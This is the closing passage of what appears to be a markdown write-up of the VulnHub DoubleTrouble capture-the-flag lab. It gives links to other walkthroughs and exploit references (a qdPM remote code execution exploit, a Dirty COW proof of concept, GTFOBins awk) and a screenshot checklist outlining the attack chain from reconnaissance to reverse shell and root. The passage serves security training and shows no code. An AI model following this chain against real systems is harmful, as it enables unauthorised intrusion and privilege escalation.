  - [DOUBLETROUBLE 1 CTF walkthrough, part 1 — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/doubletrouble-1-vulnhub-ctf-walkthrough-part-1/)
  - [DOUBLETROUBLE 1 CTF walkthrough, part 2 — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/doubletrouble-1-vulnhub-ctf-walkthrough-part-2/)
  - [Walkthrough: Vulnhub Doubletrouble — Mattia Zignale](https://www.mattiazignale.it/en/walkthrough-vulnhub-doubletrouble-english-version/)
  - [VulnHub DoubleTrouble Writeup — Tanveer Abdulaziz](https://firerey12.github.io/vulnhub/double-trouble)
  - [Doubletrouble 1 Walkthrough — Mridul Bhardwaj (Medium)](https://mridulbhardwajj.medium.com/doubletrouble-1-walkthrough-8810359abb37)
- Vendor advisories / docs:
  - [Exploit-DB — qdPM 9.1 RCE (50175)](https://www.exploit-db.com/exploits/50175)
  - [CVE-2016-5195 — Dirty COW](https://nvd.nist.gov/vuln/detail/CVE-2016-5195)
  - [Dirty COW PoC — FireFart](https://github.com/FireFart/dirtycow)
  - [GTFOBins — awk](https://gtfobins.github.io/gtfobins/awk/)
  - [StegSeek](https://github.com/RickdeJager/stegseek)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with netdiscover / arp-scan
- [ ] `images/02-gobuster.png` — Nmap + gobuster directory discovery
- [ ] `images/03-enum.png` — `databases.yml` leak and `/secret` image
- [ ] `images/04-shell-wwwdata.png` — qdPM RCE reverse shell as `www-data`
- [ ] `images/05-privesc-awk.png` — `sudo awk` escalation to root
- [ ] `images/06-second-vm.png` — downloading/importing the nested VM
- [ ] `images/07-privesc-dirtycow.png` — Dirty COW rooting the inner VM
- [ ] `images/08-root-flag.png` — reading the final root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
